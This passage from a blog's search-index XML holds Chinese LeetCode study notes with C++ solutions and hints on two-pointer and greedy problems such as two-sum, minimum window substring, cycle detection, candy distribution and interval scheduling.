class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：想想偶数位和奇数位的出现单个元素后的变化情况。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">寻找两个正序数组的中位数</a><br>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。<br>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p><p>解答：<del>暂时还不会</del></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(二): 双指针</title>
      <link href="/post/4bd96ca6.html"/>
      <url>/post/4bd96ca6.html</url>
      
        <content type="html"><![CDATA[<p>双指针算法的核心思想：双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。也可以延伸到多个数组的多个指针。</p><h2 id="一、Two-Sum"><a href="#一、Two-Sum" class="headerlink" title="一、Two Sum"></a>一、Two Sum</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted">两数之和 II - 输入有序数组</a><br>给你一个下标从1开始的整数数组 <code>numbers</code> ，该数组已按 <strong>非递减顺序排列</strong> ，请你从数组中找出满足相加之和等于目标数 <code>target</code> 的两个数。如果设这两个数分别是 <code>numbers[index1]</code> 和 <code>numbers[index2]</code> ，则 <code>1 &lt;= index1 &lt; index2 &lt;= numbers.length</code> 。以长度为 2 的整数数组 <code>[index1, index2]</code> 的形式返回这两个整数的下标 <code>index1</code> 和 <code>index2</code>。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; numbers, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = numbers.<span class="built_in">size</span>() - <span class="number">1</span>, two_sum;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        two_sum = numbers[l] + numbers[r];</span><br><span class="line">        <span class="keyword">if</span> (two_sum == target) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (two_sum &lt; target) ++l;</span><br><span class="line">        <span class="keyword">else</span> --r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;l + <span class="number">1</span>, r + <span class="number">1</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：利用非递减数列的性质。</p></li></ul><h2 id="二、归并两个有序数组"><a href="#二、归并两个有序数组" class="headerlink" title="二、归并两个有序数组"></a>二、归并两个有序数组</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/merge-sorted-array">合并两个有序数组</a><br>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。<br>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code> 中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> pos = --m + --n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m &lt; <span class="number">0</span>) nums1[pos--] = nums2[n--];</span><br><span class="line">            <span class="keyword">else</span> nums1[pos--] = nums1[m] &gt; nums2[n] ? nums1[m--] : nums2[n--];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题。</p></li></ul><h2 id="三、滑动窗口"><a href="#三、滑动窗口" class="headerlink" title="三、滑动窗口"></a>三、滑动窗口</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/minimum-window-substring">最小覆盖子串</a><br>给你一个字符串 <code>s</code> 、一个字符串 <code>t</code> 。返回 <code>s</code> 中涵盖 <code>t</code> 所有字符的最小子串。如果 <code>s</code> 中不存在涵盖 <code>t</code> 所有字符的子串，则返回空字符串 <code>&quot;&quot;</code> 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">valid</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">frequence</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : t) &#123;</span><br><span class="line">            valid[c] = <span class="literal">true</span>;</span><br><span class="line">            frequence[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> min_length = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> min_r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">accumulate</span>(valid.<span class="built_in">begin</span>(), valid.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (l &lt; s.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (valid[s[l]]) &#123;</span><br><span class="line">                frequence[s[l]]--;</span><br><span class="line">                <span class="keyword">if</span> (frequence[s[l]] == <span class="number">0</span>) count--;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (!valid[s[r]] || frequence[s[r]] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (frequence[s[r]] &lt; <span class="number">0</span>) </span><br><span class="line">                            frequence[s[r]]++;</span><br><span class="line">                        r++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (min_length == <span class="number">-1</span> || min_length &gt; l - r + <span class="number">1</span>) &#123;</span><br><span class="line">                        min_length = l - r + <span class="number">1</span>;</span><br><span class="line">                        min_r = r;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> min_length == <span class="number">-1</span> ? <span class="string">&quot;&quot;</span> : s.<span class="built_in">substr</span>(min_r, min_length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要存储某些信息来方便处理。</p></li></ul><h2 id="四、快慢指针"><a href="#四、快慢指针" class="headerlink" title="四、快慢指针"></a>四、快慢指针</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/linked-list-cycle-ii">环形链表 II</a></p><p>给定一个链表的头节点  <code>head</code> ，返回链表开始入环的第一个节点。 <em>如果链表无环，则返回 <code>null</code>。</em><br>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（<strong>索引从 0 开始</strong>）。如果 <code>pos</code> 是 <code>-1</code>，则在该链表中没有环。<strong>注意：<code>pos</code> 不作为参数进行传递</strong>，仅仅是为了标识链表的实际情况。<br><img src="https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Definition for singly-linked list.</span></span><br><span class="line"><span class="comment">// struct ListNode &#123;</span></span><br><span class="line"><span class="comment">//     int val;</span></span><br><span class="line"><span class="comment">//     ListNode *next;</span></span><br><span class="line"><span class="comment">//     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="type">bool</span> has_cycle = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow || has_cycle) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fast == <span class="literal">nullptr</span> || fast-&gt;next == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            has_cycle = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：<strong>Floyd判圈算法</strong>：对于链表找环路的问题，有一个通用的解法——快慢指针（Floyd 判圈法）。给定两个指针，分别命名为 slow 和 fast，起始位置在链表的开头。每次 fast 前进两步，slow 前进一步。如果 fast 可以走到尽头，那么说明没有环路；如果 fast 可以无限走下去，那么说明一定有环路，且一定存在一个时刻 slow 和 fast 相遇。当 slow 和 fast 第一次相遇时，我们将 fast 重新移动到链表开头，并 让 slow 和 fast 每次都前进一步。当 slow 和 fast 第二次相遇时，相遇的节点即为环路的开始点。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/sum-of-square-numbers/">平方数之和</a><br>给定一个非负整数 <code>c</code> ，你要判断是否存在两个整数 <code>a</code> 和 <code>b</code>，使得 <code>a^2 + b^2 = c</code> 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">0</span>, b = <span class="built_in">sqrt</span>(c);</span><br><span class="line">        <span class="keyword">while</span> (a &lt;= b) &#123;</span><br><span class="line">            <span class="type">long</span> sum = (<span class="type">long</span>) a * a + (<span class="type">long</span>) b * b;</span><br><span class="line">            <span class="keyword">if</span> (sum &lt; c) ++a;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; c) --b;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：最大值的选择为开方。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-word-in-dictionary-through-deleting/">通过删除字母匹配到字典里最长单词</a><br>给你一个字符串 <code>s</code> 和一个字符串数组 <code>dictionary</code> ，找出并返回 <code>dictionary</code> 中最长的字符串，该字符串可以通过删除 <code>s</code> 中的某些字符得到。<br>如果答案不止一个，返回长度最长且字母序最小的字符串。如果答案不存在，则返回空字符串。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">aHasb</span><span class="params">(string a, string b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; a.<span class="built_in">length</span>() &amp;&amp; j &lt; b.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] == b[j]) ++j;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j == b.<span class="built_in">length</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">findLongestWord</span><span class="params">(string s, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dictionary.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">-1</span> &amp;&amp; (dictionary[i].<span class="built_in">length</span>() &lt; dictionary[res].<span class="built_in">length</span>() ||                 (dictionary[i].<span class="built_in">length</span>() == dictionary[res].<span class="built_in">length</span>() &amp;&amp; dictionary[i] &gt;                                dictionary[res]))) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="built_in">aHasb</span>(s, dictionary[i]);</span><br><span class="line">            <span class="keyword">if</span> (flag) res = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == <span class="number">-1</span> ? <span class="string">&quot;&quot;</span> : dictionary[res];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：双指针分别用于两个字符串的开头来判断包含关系。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(一): 贪心</title>
      <link href="/post/4d5c39be.html"/>
      <url>/post/4d5c39be.html</url>
      
        <content type="html"><![CDATA[<p>贪心算法的核心思想：局部最优以实现全局最优。</p><h2 id="一、分配问题"><a href="#一、分配问题" class="headerlink" title="一、分配问题"></a>一、分配问题</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/candy">分发糖果</a><br>n 个孩子站成一排。给你一个整数数组 ratings 表示每个孩子的评分。<br>你需要按照以下要求，给这些孩子分发糖果：</p><ul><li>每个孩子至少分配到 1 个糖果。</li><li>相邻两个孩子中，评分更高的那个会获得更多的糖果。<br>请你给每个孩子分发糖果，计算并返回需要准备的最少糖果数目。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;ratings)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">candies</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &gt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i] = candies[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &lt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i - <span class="number">1</span>] = <span class="built_in">max</span>(candies[i - <span class="number">1</span>], candies[i] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">accumulate</span>(candies.<span class="built_in">begin</span>(), candies.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>提示：两次遍历，每次只用关注相邻的一边即可。</p></li></ul><h2 id="二、区间问题"><a href="#二、区间问题" class="headerlink" title="二、区间问题"></a>二、区间问题</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/non-overlapping-intervals">无重叠区间</a><br>给定一个区间的集合 intervals ，其中 intervals[i] &#x3D; [starti, endi] 。返回需要移除区间的最小数量，使剩余区间互不重叠。<br>注意：只在一点上接触的区间是不重叠的。例如 [1, 2] 和 [2, 3] 是不重叠的。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">eraseOverlapIntervals</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; &amp;b)</span><br><span class="line">             &#123; <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>]; &#125;);</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt; interval : intervals) &#123;</span><br><span class="line">            <span class="keyword">if</span> (interval[<span class="number">0</span>] &lt; prev)</span><br><span class="line">                count++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = interval[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：要做到尽量互不重叠即需要保留end越小越好。</p></li></ul><h2 id="三、练习"><a href="#三、练习" class="headerlink" title="三、练习"></a>三、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">买卖股票的最佳时机 II</a><br>给你一个整数数组 prices ，其中 prices[i] 表示某支股票第 i 天的价格。<br>在每一天，你可以决定是否购买和&#x2F;或出售股票。你在任何时候最多只能持有一股股票。你也可以先购买，然后在同一天出售。<br>返回你能获得的最大利润 。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> prev = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; prev) &#123;</span><br><span class="line">                prev = prices[i];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += (prices[i] - prev);</span><br><span class="line">            prev = prices[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：动态规划 is always right。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/partition-labels/">划分字母区间</a><br>给你一个字符串s。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。例如，字符串”ababcc”能够被分为[“abab”, “cc”]，但类似[“aba”, “bcc”] 或[“ab”, “ab”, “cc”]的划分是非法的。<br>注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是s。<br>返回一个表示每个字符串片段的长度的列表。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash1</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash2</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; intervals;</span><br><span class="line">        intervals.<span class="built_in">reserve</span>(<span class="number">52</span>);</span><br><span class="line">        <span class="type">int</span> length = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>)</span><br><span class="line">                hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">                hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">                vector&lt;<span class="type">int</span>&gt; interval = &#123;hash2[s[i] - <span class="string">&#x27;a&#x27;</span>], hash1[s[i] - <span class="string">&#x27;a&#x27;</span>]&#125;;</span><br><span class="line">                intervals.<span class="built_in">push_back</span>(interval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        res.<span class="built_in">reserve</span>(length);</span><br><span class="line">        <span class="type">int</span> start = intervals[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; intervals.<span class="built_in">size</span>(); i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &lt; prev) </span><br><span class="line">                prev = prev &gt; intervals[i][<span class="number">1</span>] ? prev : intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">                start = intervals[i][<span class="number">0</span>];</span><br><span class="line">                prev = intervals[i][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记录开始和结束位置转化为区间问题。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker部署SpringBoot+Vue前后端分离项目</title>
      <link href="/post/70e0611f.html"/>
      <url>/post/70e0611f.html</url>
      
